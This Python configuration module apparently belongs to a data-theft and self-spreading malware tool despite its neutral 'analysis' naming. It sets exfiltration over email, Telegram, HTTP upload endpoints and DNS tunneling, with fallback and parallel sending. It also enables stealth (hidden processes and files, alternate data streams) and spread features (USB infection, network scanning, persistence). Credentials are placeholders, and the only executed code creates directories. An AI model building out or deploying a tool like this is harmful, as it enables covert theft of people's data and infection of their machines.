"""
Configuration Module
Contains all configurable parameters
"""

import os
import uuid

class Config:
    # Session Configuration
    SESSION_ID = str(uuid.uuid4())[:8]
    
    # Email Configuration
    EMAIL_CONFIG = {
        'smtp_server': 'smtp.gmail.com',
        'smtp_port': 587,
        'email': 'your_email@gmail.com',
        'password': 'your_app_password',
        'recipient': 'your_recipient@gmail.com'
    }
    
    # Telegram Configuration
    TELEGRAM_CONFIG = {
        'bot_token': 'YOUR_BOT_TOKEN',
        'chat_id': 'YOUR_CHAT_ID'
    }
    
    # HTTP Endpoints
    HTTP_CONFIG = {
        'endpoints': [
            'https://httpbin.org/post',
            'https://your-server.com/upload'
        ]
    }
    
    # DNS Tunneling
    DNS_CONFIG = {
        'domain': 'your-domain.com'
    }
    
    # Encryption Settings
    ENCRYPTION_CONFIG = {
        'algorithm': 'AES-256',
        'enabled': True,
        'key_rotation': 86400  # 24 hours
    }
    
    # Stealth Settings
    STEALTH_CONFIG = {
        'hide_process': True,
        'hide_files': True,
        'use_alternate_data_streams': True,
        'random_delays': True
    }
    
    # Spread Settings
    SPREAD_CONFIG = {
        'usb_infection': True,
        'network_scanning': True,
        'persistence': True,
        'max_retries': 3
    }
    
    # Transmission Settings
    TRANSMISSION_CONFIG = {
        'compression': True,
        'encryption': True,
        'max_chunk_size': 4000,
        'fallback_methods': ['telegram', 'email', 'http', 'dns'],
        'parallel_transmit': True
    }
    
    # Analysis Settings
    ANALYSIS_CONFIG = {
        'enable_ml': True,
        'pattern_detection': True,
        'behavioral_analysis': True,
        'risk_threshold': 70
    }
    
    # Logging Settings
    LOGGING_CONFIG = {
        'log_level': 'INFO',
        'log_file': 'analysis.log',
        'rotate': True,
        'max_size_mb': 10
    }
    
    # System Paths
    PATHS = {
        'analysis_dir': f'analysis_{SESSION_ID}',
        'log_dir': 'logs',
        'backup_dir': 'backups',
        'temp_dir': 'temp'
    }

# Create directories
for path in Config.PATHS.values():
    if not path.startswith('analysis_'):
        os.makedirs(path, exist_ok=True)